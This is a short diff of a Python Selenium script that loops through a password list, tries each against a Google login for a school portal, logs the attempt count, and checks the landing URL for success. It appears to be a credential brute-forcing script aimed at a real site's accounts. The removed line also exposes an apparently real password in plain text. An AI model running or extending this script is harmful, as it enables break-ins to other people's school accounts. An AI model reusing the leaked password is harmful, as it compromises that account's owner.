@@ -42,7 +42,7 @@ for line in PasswordsArray:
    password = line
    login("https://csus.myschoolapp.com/app#login", "Username", Email, "nextBtn")
    GoogleEmaillogin("identifierNext")
-   GooglePasslogin("password", "TtqU320*", "passwordNext")
+   GooglePasslogin("password", "***", "passwordNext")
    Counter = Counter + 1
    PassNumVar.write(str(Counter) + "\n")
    if driver.current_url == "https://csus.myschoolapp.com/app/student#studentmyday/assignment-center":
